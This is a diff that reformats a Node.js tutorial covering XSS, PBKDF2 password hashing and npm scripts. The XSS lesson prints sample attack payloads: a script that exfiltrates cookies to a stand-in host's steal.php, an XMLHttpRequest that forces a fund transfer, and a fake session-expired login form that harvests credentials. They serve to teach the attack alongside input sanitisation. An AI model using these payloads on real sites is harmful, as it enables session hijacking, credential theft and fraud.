@@ -5092,59 +5092,102 @@ app.get('/mutants/:role', function(req, res, next){
 
 ## Terminology  
 
-XSS (Cross-site scripting):
-Allows an attacker to inject malicious code into a website through various methods.
-The request / response cycle is used as a mechanism to execute the code from the victim's browser.
-Vulnerable websites are exploited, not the victim's machine.
-How?  
+* `XSS` (Cross-site scripting):
 
-An attacker uses a vulnerable input to inject a string containing malicious code, which subsequently runs in the victim's browser as legitimate code.
-The JavaScript Code:
-Can be used to modify the HTML by using DOM manipulation methods.
-Can access sensitive information, such as cookies.
-Use XMLHttpRequest to send arbitrary content to arbitrary destinations.
-Types of attack:  
+  * Allows an attacker to inject malicious code into a website through various methods.
 
-Reflected XSS: it does not originate from the targeted server, but from the victim's request.
-This attacked can be delivered via another website or an email.
-The injected code is reflected off the server in a search result, error message, or another response which includes all or part of the input sent to the server as a request.
-A URL containing the malicious code is sent to the victim.
-The victim then requests the URL from the website.
-The website includes the malicious string from the URL in the response.
-The victim's browser executes the code sending the victims data back to the attacker's server.
-Persistent (stored) XSS: the malicious code is stored in a target's server, where it is later retrieved by the victim via a request for data containing the malicious code.
-The attacker inject the malicious code into the server via a vulnerable form, which is stored in the database.
-The victims makes a request to the website.
-The response, containing the malicious code, is sent to the victim.
-The victim's browser executes the code sending the victims data back to the attacker's server.
-DOM-based XSS: a combination of both persistent and reflected XSS:
-A URL containing the malicious code is sent to the victim.
-The victim then requests the URL from the website.
-The targeted website receives the request, but it does not include the malicious code in the response.
-The victim's browser executes the legitimate code inside the response, inserting the malicious code into the website.
-The victim's browser executes the inserted malicious code and sends the response back to the attacker's server containing the victims data.
-What makes it different?
-No malicious code is inserted into the website.
-The website's own code uses the user's input in order to add HTML into the page using innerHTML.
-The code is parsed as HTML, which in turn executes the code after the page has loaded.
-Key-logging: malicious code is using addEventListener is used to send a victim's keystrokes back to the attacker's server.
-Impact On User Privacy  
+  * The `request` / `response` cycle is used as a mechanism to execute the code from the victim's browser.
 
-Stealing sensitive data  
+  * Vulnerable websites are exploited, not the victim's machine.
 
-Cardholder data or personal identifiable information (bank account number, address, username, etc) is stolen and used to siphon funds or perform unauthorized transactions
-Example
-In this example an XMLHttpRequest is used to transfer funds from the victim to the attacker.
+## How?  
+
+* An attacker uses a vulnerable `input` to *inject* a `string` containing malicious code, which subsequently runs in the victim's browser as legitimate code.
+
+* The JavaScript Code:
+
+  * Can be used to modify the `HTML` by using `DOM` manipulation methods.
+
+  * Can access sensitive information, such as `cookies`.
+
+  * Use `XMLHttpRequest` to send arbitrary content to arbitrary destinations.
+
+## Types of attack:  
+
+* **Reflected XSS**: it does **not** originate from the targeted server, but from the victim's `request`.
+
+  * This attacked can be delivered via another website or an email.
+
+  * The injected code is *reflected* off the server in a search result, error message, or another `response` which includes all or part of the `input` sent to the server as a `request`.
+
+    1. A URL containing the malicious code is sent to the victim.
+
+    2. The victim then `requests` the URL from the website.
+
+    3. The website includes the malicious string from the URL in the `response`.
+
+    4. The victim's browser executes the code sending the victims data back to the attacker's server.
+
+* **Persistent (stored) XSS**: the malicious code is stored in a target's server, where it is later retrieved by the victim via a `request` for data containing the malicious code.
+
+  1. The attacker inject the malicious code into the server via a vulnerable form, which is stored in the database.
+
+  2. The victims makes a `request` to the website.
+
+  3. The `response`, containing the malicious code, is sent to the victim.
+
+  4. The victim's browser executes the code sending the victims data back to the attacker's server.
+
+* **DOM-based XSS**: a combination of both `persistent` and `reflected` `XSS`:
+
+  1. A URL containing the malicious code is sent to the victim.
+
+  2. The victim then `requests` the URL from the website.
+
+  3. The targeted website receives the `request`, but *it does not* include the malicious code in the `response`.
+
+  4. The victim's browser executes the *legitimate* code inside the `response`, inserting the malicious code into the website.
+
+  5. The victim's browser executes the *inserted* malicious code and sends the `response` back to the attacker's server containing the victims data.
+
+  6. What makes it different?
+
+  7. No malicious code is inserted into the website.
+
+  8. The website's own code uses the user's input in order to add `HTML` into the page using `innerHTML`.
+
+  9. The code is `parsed` as `HTML`, which in turn executes the code *after* the page has loaded.
+
+* **Key-logging**: malicious code is using `addEventListener` is used to send a victim's keystrokes back to the attacker's server.
+
+## Impact On User Privacy  
+
+### Stealing sensitive data  
+
+* Cardholder data or personal identifiable information (bank account number, address, username, etc) is stolen and used to siphon funds or perform unauthorized transactions
+
+#### Example
+
+* In this example an `XMLHttpRequest` is used to transfer funds from the victim to the attacker.
+
+```
 <script>
   var xhr = new XMLHttpRequest();
   xhr.open('POST',http://youvenoidea.com/transfer',true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded'); xhr.send('transfer[from]=5124834860&transfer[to_user_id]=48&transfer[amount]=1000&commit=Transfer');
   </script>
-Stealing credentials  
+```
 
-JavaScript and HTML are used to steal credentials instead of cookies. A targeted website's login page is cloned and it is served to a victim.
-Example
-In this example a cloned login page is used to steal a victims credentials.
-The attacker then can wreak havoc in the victim's social media, bank accounts, etc.
+### Stealing credentials  
+
+* `JavaScript` and `HTML` are used to steal credentials instead of `cookies`. A targeted website's login page is cloned and it is served to a victim.
+
+#### Example
+
+* In this example a cloned login page is used to steal a victims credentials.
+
+* The attacker then can wreak havoc in the victim's social media, bank accounts, etc.
+
+```html
 <div>
   <h3>Security Alert</h3>
   <h4>Your session has expired.</h4>
@@ -5154,24 +5197,39 @@ The attacker then can wreak havoc in the victim's social media, bank accounts, e
     <input type="submit" value="Logon">
   </form>
 </div>
-Account Hijacking  
+```
 
-A victim's session cookies are stolen, which in turn are used by the attacker to impersonate the victim and access sensitive information from their social media, bank accounts, etc.
-Example
-In this example an attacker targets a forms vulnerable field to inject a malicious image.
+### Account Hijacking  
+
+* A victim's `session` `cookies` are stolen, which in turn are used by the attacker to impersonate the victim and access sensitive information from their social media, bank accounts, etc.
+
+#### Example
+
+* In this example an attacker targets a forms vulnerable field to inject a malicious image.
+
+```
 <script>
 new Image().src = 'http://youvenoidea/steal.php?cookies=' +  encodeURI(document.cookie);
 </script>
-Mitigating XSS  
+```
 
-All user input should be escaped or sanitized.
-express-validator  
+## Mitigating XSS  
 
-The express-validator module simplifies input sanitation.
-Usage
-Install express-validator: npm install express-validator --save
-Import: var validator = require('express-validator')
-Apply after body-parser
+* All user input should be escaped or sanitized.
+
+### express-validator  
+
+* The `express-validator` module simplifies input sanitation.
+
+### Usage
+
+* Install `express-validator`: `npm install express-validator --save`
+
+* mport: `var validator = require('express-validator')`
+
+* Apply after `body-parser`
+
+```js
 //req.body.password = 'a <span>comment</span>';
 //req.body.username = " I'm-gonna-hack-you' ";
 
@@ -5189,6 +5247,7 @@ app.post('/login', function(request, response){
   else
     res.render('login', {password: req.password, username: req.username});
 });
+```
 
 ---
 
@@ -5198,74 +5257,127 @@ app.post('/login', function(request, response){
 
 ## Terminology  
 
-PBKDF2: a “password-strengthening algorithm” (HMAC) use to safeguard a password during a brute force attack by making it difficult, using iterations, to check whether or not that password is the master password.
-Iterations: the number of times the encryption algorithm is applied.
-increases the strength of a password by increasing the time it takes to test each key in a brute force attack.
-key: the combination of the password, salt, and iterations count.
-SHA-256: Cryptographic Hash Algorithm that generates a unique 256-bit (32-byte) signature.
-Encoding:
-hex: 64 characters.
-base64: 44 characters.
-SHA-512: Cryptographic Hash Algorithm that generates a unique 512-bit (64-byte) signature.
-Encoding:
-hex: 128 characters.
-base64: 88 characters.
-HMAC: hash based authentication code.
-Hashing: the process of creating a fixed-length cryptic string from a variable-length string (password).
-Salt: a unique and random string of characters used as an extra input in a hashing function in order to safeguard a stored password.
-salt is added to the password before hashing. This helps randomize the password and increases it's complexity in order to safeguard against rainbow and lookup table attacks.
-A 12 bit salt would require 4096 rainbow tables in order to find a common password.
-Digest: In a cryptographic hash function, the digest is the function's fixed-size alphanumeric output. (also known as message digest, checksum and digital fingerprint)
+* `PBKDF2`: a “password-strengthening algorithm” (`HMAC`) use to safeguard a password during a brute force attack by making it difficult, using `iterations`, to check whether or not that password is the master password.
 
-Crypto (module):
+  * `Iterations`: the number of times the encryption algorithm is applied.
 
-The crypto module provides cryptographic functionality that includes a set of wrappers for OpenSSL's hash, HMAC, cipher, decipher, sign and verify functions. -nodejs.org
+    * increases the strength of a password by increasing the time it takes to test each key in a brute force attack.
 
-Why Salt and Hash?  
+    * `key`: the combination of the password, `salt`, and `iterations` count.
 
-Avoid duplicate hashes.
-Hashes of the same password are identical.
-Makes it possible to decipher using a rainbow or lookup table.
-Two users could share the same password, therefore the same hash. A hacker can use this to predict passwords.
-Therefore, adding salt to a password and then hashing it reduces the chance of having duplicated hashes.
-Never, EVER, store a password as plain text. EVER.
-PBKDF2 Implementation  
+* `SHA-256`: Cryptographic Hash Algorithm that generates a unique 256-bit (32-byte) signature.
 
-Create password hash:
-Input: user password.
-Generate Salt.
-Generate hash:
-Store resulting password hash, salt, and iterations (for validation).
-Validate attempted password:
-Input: attempted password.
-Retrieve password hash, salt, and iterations.
-Generate hash:
-Hash attempted password / stored salt / stored iterations:
-Assert resulting hash against stored hash.
-Recommendation  
+  * Encoding:
 
-Use Password-Based Key Derivation Function 2 (PBKDF2).1
-Salt should be as unique as possible. Consider creating a random key with a length greater than 16 bytes.
-Iterations should be a number set as high as possible. The higher, the more secure the key will be.
-The higher the iteration, the longer it will take to complete the process.
-keylen: byte length of the digest, derived from the password, salt and iterations.
-digest: use either sha256 or shat512 to encrypt the output.
-AGAIN: never, EVER, store a password as plain text. EVER.
-Example  
+    * `hex`: 64 characters.
 
-In this example we use Express's Crypto module.
-Synchronous implementation: crypto.pbkdf2Sync(password, salt, iterations, keylen, digest)
-If an error happens, an Error is thrown. If not, the key is returned as a Buffer.
-Learn more
-Your implementation may differ.
-See Node.js docs for asynchronous implementation.
-Creating a hashed password - Implementation suggestion  
+    * `base64`: 44 characters.
 
-Crypto randomBytes
-Math.ceil(): returns the smallest integer greater than or equal to a given number. 2
-toString('base64'): convert string to base64.
-toString('hex'): convert string to a hexadecimal.
-randomByes(): generates a random string.
+* `SHA-512`: Cryptographic Hash Algorithm that generates a unique 512-bit (64-byte) signature.
+
+  * Encoding:
+
+    * `hex`: 128 characters.
+
+    * `base64`: 88 characters.
+
+* `HMAC`: hash based authentication code.
+
+* `Hashing`: the process of creating a fixed-length cryptic string from a variable-length string (password).
+
+* Salt: a unique and random string of characters used as an extra input in a hashing function in order to safeguard a stored password.
+
+  * `salt` is added to the password *before* `hashing`. This helps randomize the password and increases it's complexity in order to safeguard against *rainbow* and *lookup* table attacks.
+
+  * A 12 bit `salt` would require 4096 rainbow tables in order to find a common password.
+
+* `Digest`: In a cryptographic hash function, the `digest` is the function's fixed-size alphanumeric output. (also known as `message digest`, `checksum` and `digital fingerprint`)
+
+* `Crypto` (module):
+
+> The crypto module provides cryptographic functionality that includes a set of wrappers for OpenSSL's hash, HMAC, cipher, decipher, sign and verify functions. -nodejs.org
+
+## Why Salt and Hash?  
+
+* Avoid duplicate `hashe`s.
+
+  * `Hashes` of the same password are identical.
+
+    * Makes it possible to decipher using a rainbow or lookup table.
+
+    * Two users could share the same password, therefore the same `hash`. A hacker can use this to predict passwords.
+
+  * Therefore, adding `salt` to a password and then `hashing` it reduces the chance of having duplicated hashes.
+
+> Never, EVER, store a password as plain text. EVER.
+
+## PBKDF2 Implementation  
+
+1. **Create password hash**:
+
+   * Input: user password.
+
+   * Generate `Salt`.
+
+   * Generate `hash`:
+
+   * Store resulting password `hash`, `salt`, and `iterations` (for validation).
+
+2. **Validate attempted password**:
+
+   * Input: attempted password.
+
+   * Retrieve password `hash`, `salt`, and `iterations`.
+
+   * Generate `hash`:
+
+     * `Hash` attempted password / stored `salt` / stored `iterations`:
+
+   * Assert resulting `hash` against stored `hash`.
+
+### Recommendation  
+
+* `Use Password-Based Key Derivation Function 2 (PBKDF2)`.1
+
+* `Salt` should be as unique as possible. Consider creating a random key with a length greater than 16 bytes.
+
+  * `Iterations` should be a number set as high as possible. The higher, the more secure the key will be.
+
+    * The higher the iteration, the longer it will take to complete the process.
+
+* `keylen`: byte length of the `digest`, derived from the password, `salt` and `iterations`.
+
+* `digest`: use either `sha256` or `sha512` to encrypt the output.
+
+> AGAIN: never, EVER, store a password as plain text. EVER.
+
+## Example  
+
+* In this example we use `Express's` `Crypto` module.
+
+* **Synchronous implementation**: `crypto.pbkdf2Sync(password, salt, iterations, keylen, digest)`
+
+  * If an error happens, an `Error` is thrown. If not, the key is returned as a `Buffer`.
+
+  * [Learn more](https://nodejs.org/api/crypto.html#crypto_crypto_pbkdf2sync_password_salt_iterations_keylen_digest**)
+
+* Your implementation may differ.
+
+> See Node.js docs for asynchronous implementation.
+
+### Creating a hashed password - Implementation suggestion  
+
+* `Crypto` [randomBytes](https://nodejs.org/api/crypto.html#crypto_crypto_randombytes_size_callback)
+
+* `Math.ceil()`: returns the smallest integer greater than or equal to a given number. 2
+
+* `toString('base64')`: convert string to base64.
+
+* `toString('hex')`: convert string to a hexadecimal.
+
+* `randomByes()`: generates a random string.
+
+```js
 'use strict';
 
 // Require Crypto module
@@ -5311,10 +5423,15 @@ function hashPassword(passwordinput){
 // Call hashPassword passing in password input.
 
 hashPassword('password123!');
-Password verification  
+```
 
-Compare saved hash to attempted password hash.
-Your implementation may differ.
+### Password verification  
+
+* Compare saved `hash` to attempted password `hash`.
+
+* Your implementation may differ.
+
+```js
 var config = {
     keylen: 512,
     digest: 'sha512'
@@ -5336,9 +5453,13 @@ function isPasswordCorrect(passwordAttempt) {
 //For demonstration purposes:
 
 isPasswordCorrect('myPassword'); // Would return false.
-Lesson Footnotes
-1: PBKDF2 - Wikipedia
-2: MDN - Math.ceil()
+```
+
+##### Lesson Footnotes
+
+* 1: [PBKDF2 - Wikipedia](https://en.wikipedia.org/wiki/PBKDF2)
+
+* 2: [MDN - Math.ceil()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math/ceil)
 
 ---
 
@@ -5432,26 +5553,36 @@ This represents a handful of core terms. See references for more.
 
 ## Terminology  
 
-npm scripts: command strings defined under the scripts property in the package.json main object.
+`npm scripts`: command strings defined under the `scripts` property in the `package.json` main object.
 
-scripts make it possible to automate tasks.
-scripts are executed in subsequent order.
-scripts are accessible in the command line by calling npm run [script-name]:
-Example
+* `scripts` make it possible to automate tasks.
 
+* `scripts` are executed in subsequent order.
+
+* `scripts` are accessible in the command line by calling `npm run [script-name]`:
+
+#### Example
+
+```
 npm run build
-For a complete list of available scripts, please check the latest npm-scripts docs.
-For module specific params and options, check the module's docs.
-Basic Scripts  
+```
 
-Starting, Stopping, and Restarting a Node App  
+> * For a complete list of available scripts, please check the latest npm-scripts docs.
+> * For module specific params and options, check the module's docs.
 
-context:  
+## Basic Scripts  
 
-project
-app.js
-script:  
+### Starting, Stopping, and Restarting a Node App  
 
+### context:  
+
+* project
+
+  * app.js
+  
+### script:  
+
+```js
 //package.json
 {
    "name": "run-node-example",
@@ -5464,32 +5595,51 @@ script:
   },
   //dependencies...
 }
-running 'app'  
+```
 
+### running 'app'  
+
+```
 npm run start
-stopping 'app'  
+```
 
+### stopping 'app'  
+
+```
 npm run stop
-restarting 'app'  
+```
 
-Runs stop, restart, and start.
+### restarting 'app'  
+
+* Runs `stop`, `restart`, and `start`.
+
+```
 npm run restart
-restart runs in addition to stop and start, not instead of the two.
-Lifecycle scripts  
+```
 
-Hooks  
+> `restart` runs *in addition* to `stop` and `start`, not instead of the two.
 
-Use to run a specific script at a lifecycle event.
+## Lifecycle scripts  
 
-pre<script-name>
-Use to define a pre-script command
-post<script-name>
-Use to define a post-script command
-See docs for a complete list of lifecycle events.
+### Hooks  
 
-Example 1  
+* Use to run a specific script at a lifecycle event.
 
-pre and post install lifecycle scripts
+  * `pre<script-name>`
+
+    * Use to define a pre-script command
+
+  * `post<script-name>`
+
+    * Use to define a post-script command
+
+* See docs for a complete list of lifecycle events.
+
+### Example 1  
+
+#### pre and post install lifecycle scripts
+
+```js
 {
   "scripts": {
     "preinstall": "echo INSTALL SOME PACKAGE",
@@ -5498,12 +5648,19 @@ pre and post install lifecycle scripts
     "postinstall": "npm run build"
   }
 }
-Running the lifecycle  
+```
 
-This will run the preinstall script first and then the postinstall script.
+### Running the lifecycle  
+
+* This will run the `preinstall` script first and then the `postinstall` script.
+
+```
 npm install
-Example 2  
+```
 
+### Example 2  
+
+```js
 // package.json
 {
   "scripts": {
@@ -5513,8 +5670,15 @@ Example 2
   }
   // Dependencies...
 }
-running 'learncode'
+```
+
+#### running 'learncode'
+
+```
 npm run learncode
+```
+
+```
 // OUTPUT
 > prelearncode
 GO TO THE IRON YARD
@@ -5525,41 +5689,64 @@ done.
 
 > postlearncode
 GET AN AWESOME JOB!
-Customizing Commands  
+```
 
-Passing arguments  
+## Customizing Commands  
 
-Pass arguments to the underlying command using --:
-Anything that comes after -- is appended to the command.
-npm run <command> [-- <args>]
-Example 1
-Lets specify a port other than 3000 for testing purposes.
+### Passing arguments  
+
+* Pass arguments to the underlying command using `--`:
+
+  * Anything that comes after `--` is appended to the command.
+
+  * `npm run <command> [-- <args>]`
+ 
+#### Example 1
+
+* Lets specify a port other than 3000 for testing purposes.
+ 
+```
 {
   "scripts": {
     "start": "node --example app.js",
     "start:test": "npm start -- 4000"
   }
 }
-Example 2
-Here we pass two global eslint variable options, in-line.
+``` 
+ 
+#### Example 2
+
+* Here we pass two global `eslint` variable options, in-line.
+
+```js
 {
   "scripts":{
     "lint:inlineoptions" : "eslint --env browser --env node app.js"
   }
 }
-Piping results  
+```
 
-Use | to pipe results from one task to the next.
-Example
-Here the results of browserify are piped into uglify, which in turns compresses (c) and magles (m) them before redirecting them (>) into the bundle.js file.
+### Piping results  
+
+* Use `|` to pipe results from one task to the next.
+
+#### Example
+
+* Here the results of `browserify` are piped into [uglify](https://www.npmjs.com/package/uglify-js), which in turns compresses (`c`) and magles (`m`) them before redirecting them (`>`) into the bundle.js file.
+
+```js
 {
   "scripts": {
     "build-js": "browserify main.js | uglifyjs -mc > bundle.js"
   }
 }
-Running commands in series / parallel  
+```
 
-Series: ; and &&
+### Running commands in series / parallel  
+
+### Series: `;` and `&&`
+
+```js
 // package.json
 {
   "scripts": {
@@ -5567,7 +5754,11 @@ Series: ; and &&
   }
   // Dependencies...
 }
-Series using run-s (npm-run-all package)
+```
+
+### Series using run-s (npm-run-all package)
+
+```js
 // package.json
 {
   "scripts": {
@@ -5575,7 +5766,11 @@ Series using run-s (npm-run-all package)
   }
   // Dependencies...
 }
-Parallel: &
+```
+
+### Parallel: `&`
+
+```js
 // package.json
 {
   "scripts": {
@@ -5583,7 +5778,11 @@ Parallel: &
   }
   // Dependencies...
 }
-Parallel using run-p (npm-run-all package)
+```
+
+### Parallel using run-p (npm-run-all package)
+
+```js
 // package.json
 {
   "scripts": {
@@ -5591,9 +5790,13 @@ Parallel using run-p (npm-run-all package)
   }
   // Dependencies...
 }
-Group Commands Scripts  
+```
 
-run-all
+### Group Commands Scripts  
+
+#### run-all
+
+```js
 // package.json
 {
   "scripts": {
@@ -5604,22 +5807,35 @@ run-all
   }
   // Dependencies...
 }
-running 'run-all'
-This will run all scripts that start with lint:
+```
+
+#### running 'run-all'
+
+* This will run all scripts that start with `lint`:
+
+```
 npm-run-all lint:*
-Running Arbitrary Tasks  
+```
 
-The following are just a handful of script examples meant to give you an idea of the things you can do using scripts. For a full list of available commands, see the official npm docs.
-Running tests  
+## Running Arbitrary Tasks  
 
-context:  
+> The following are just a handful of script examples meant to give you an idea of the things you can do using scripts. For a full list of available commands, see the official npm docs.
 
-project
-tests
-app-test.js
-app.js
-script:  
+## Running tests  
 
+### context:  
+
+* project
+
+  * tests
+
+    * app-test.js
+
+  * app.js
+  
+### script:  
+
+```js
 //package.json
 {
    "name": "test-example",
@@ -5628,54 +5844,81 @@ script:
   },
     //dependencies...
 }
-Running 'test'  
+```
 
+### Running 'test'  
+
+```
 $ npm run test
-Deploying to GitHub  
+```
 
-Basic Example  
+## Deploying to GitHub  
 
+### Basic Example  
+
+```
 "scripts": {
     "build:js": "browserify main.js -o bundle.js",
     "git-commit": "git add -A . && git commit -a -m 'gh-pages update'",
     "git-push": "git push origin gh-pages --force && git checkout master",
     "deploy": "npm run build:js && npm run git-commit && npm run git-push"
   }
-Running 'deploy'  
+```
 
+### Running 'deploy'  
+
+```
 npm run deploy
-Building  
+```
 
-context:  
+## Building  
 
-An app that uses browserify and SCSS.
+### context:  
 
-It compiles modules in order to be used in the browser.
-Install browserify: npm install --save browserify
+* An app that uses `browserify` and `SCSS`.
 
-Install node-sass: $ npm install -D node-sass
+  * It compiles modules in order to be used in the browser.
 
--D: writes modules under devDependencies in package.json
-Project
+* Install `browserify`: `npm install --save browserify`
 
-app.js
-utilities.js
-public
-css
-main.css
-scss
-main.scss
+* Install `node-sass`: `$ npm install -D node-sass`
+
+  * `-D`: writes modules under devDependencies in package.json
+
+* `Project`
+
+  * app.js
+
+  * utilities.js
+
+  * `public`
+
+    * `css`
+
+      * main.css
+
+  * `scss`
+
+    * main.scss
+    
+```js    
 //app.js
 var utilities = require('./utilities.js');  
 console.log(utilities.somefunction);  
+```
+
+```js
 //utilities.js
 module.exports = {
   somefunction: function(){
     console.log("I'm a utility file!")
   }
 };
-script  
+```
 
+### script  
+
+```js
 {
   "name": "build-app",
   "main": "index.js",
@@ -5687,13 +5930,21 @@ script
     "node-sass": "^4.5.3"
   }
 }
-Running 'build'  
+```
 
-This will bundle main.js and its dependencies into one file.
--o bundle.js tells browserify the specific output of the file to be compiled.
+### Running 'build'  
+
+* This will bundle main.js and its dependencies into one file.
+
+  * `-o bundle.js` tells `browserify` the specific output of the file to be compiled.
+
+```
 npm run build:js
-Building And Compiling  
+```
 
+## Building And Compiling  
+
+```js
 {
   "name": "build-app",
   "description": "",
@@ -5708,13 +5959,21 @@ Building And Compiling
     "node-sass": "^4.5.3"
   }
 }
-Running 'build'  
+```
 
-This will compile the css and bundle the JavaScript
+### Running 'build'  
+
+* This will compile the `css` and bundle the JavaScript
+
+```
 npm run build
-Example: Using postinstall when deploying to heroku  
+```
 
-We can automatically compile and bundle using npm install by specifying this commands in postinstall.
+### Example: Using postinstall when deploying to heroku  
+
+* We can automatically compile and bundle using `npm install` by specifying this commands in `postinstall`.
+
+```js
 {
   "name": "build-app",
   "main": "index.js",
@@ -5728,18 +5987,31 @@ We can automatically compile and bundle using npm install by specifying this com
     "node-sass": "^4.5.3",
   }
 }
-Running 'install'
-When heroku runs npm install, postinstall will be executed after install is completed, which in turns runs build.
-This makes it easier to deploy the app to heroku.
+```
+
+### Running 'install'
+
+* When `heroku` runs `npm install`, `postinstall` will be executed after `install` is completed, which in turns runs `build`.
+
+  *  This makes it easier to `deploy` the app to `heroku`.
+  
+```  
 npm install
-Automatic Recompiling and Monitoring for Changes  
+```
 
-Recompile bundle.js whenever a source file changes using watchify.
-Monitor for code changes using nodemon (restarts server when changes are detected).
-Install: npm install --save-dev node-sass nodemon
-script  
+## Automatic Recompiling and Monitoring for Changes  
 
-Let's add it to the script above:
+* Recompile bundle.js whenever a source file changes using `watchify`.
+
+* Monitor for code changes using `nodemon` (restarts server when changes are detected).
+
+  * Install: `npm install --save-dev node-sass nodemon`
+
+### script  
+
+* Let's add it to the script above:
+
+```js
 {
   "name": "build-app",
   "main": "index.js",
@@ -5758,15 +6030,25 @@ Let's add it to the script above:
     "nodemon": "^1.11.0"
   }
 }
-Running 'watch'  
+```
 
+### Running 'watch'  
+
+```
 npm run watch
-Putting It All Together  
+```
 
-Let's pretend we:
-add an http-server and run it via a serve script.
-want to run all of it from one command via start:
-This script might look something like this:
+## Putting It All Together  
+
+* Let's pretend we:
+
+  * add an `http-server` and run it via a `serve` script.
+
+  * want to run all of it from one command via `start`:
+
+  * This script might look something like this:
+  
+```
   {
     "name": "build-app",
     "main": "index.js",
@@ -5787,24 +6069,29 @@ This script might look something like this:
       "nodemon": "^1.11.0"
     }
   }
-Running 'start'  
+```
 
+### Running 'start'  
+
+```
 npm run start
-Best Practices  
+```
 
-Don't exit with a non-zero error code unless you really mean it. Except for uninstall scripts, this will cause the npm action to fail, and potentially be rolled back. If the failure is minor or only will prevent some optional features, then it's better to just print a warning and exit successfully.
+## Best Practices  
 
-Try not to use scripts to do what npm can do for you. Read through package.json to see all the things that you can specify and enable by simply describing your package appropriately. In general, this will lead to a more robust and consistent state.
+> *Don't exit with a non-zero error code unless you really mean it. Except for uninstall scripts, this will cause the npm action to fail, and potentially be rolled back. If the failure is minor or only will prevent some optional features, then it's better to just print a warning and exit successfully.*
+> 
+> *Try not to use scripts to do what npm can do for you. Read through package.json to see all the things that you can specify and enable by simply describing your package appropriately. In general, this will lead to a more robust and consistent state.*
+> 
+> *Inspect the env to determine where to put things. For instance, if the npmconfigbinroot environment variable is set to /home/user/bin, then don't try to install executables into /usr/local/bin. The user probably set it up that way for a reason.*
+> 
+> *Don't prefix your script commands with "sudo". If root permissions are required for some reason, then it'll fail with that error, and the user will sudo the npm command in question.*
+> 
+> *Don't use install. Use a .gyp file for compilation, and prepublish for anything else. You should almost never have to explicitly set a preinstall or install script. If you are doing this, please consider if there is another option. The only valid use of install or preinstall scripts is for compilation which must be done on the target architecture.*
 
-Inspect the env to determine where to put things. For instance, if the npmconfigbinroot environment variable is set to /home/user/bin, then don't try to install executables into /usr/local/bin. The user probably set it up that way for a reason.
+## Recommendation  
 
-Don't prefix your script commands with "sudo". If root permissions are required for some reason, then it'll fail with that error, and the user will sudo the npm command in question.
-
-Don't use install. Use a .gyp file for compilation, and prepublish for anything else. You should almost never have to explicitly set a preinstall or install script. If you are doing this, please consider if there is another option. The only valid use of install or preinstall scripts is for compilation which must be done on the target architecture.
-
-Recommendation  
-
-Watch: Nordic.js 2015 • Kate Hudson - Advanced front-end automation with npm scripts
+* Watch: [Nordic.js 2015 • Kate Hudson - Advanced front-end automation with npm scripts](https://www.youtube.com/watch?v=0RYETb9YVrk&feature=youtu.be&list=PLw5h0DiJ-9PAZ5-LYQY_JlCojZ5Q9BMHA)
 
 ---
 
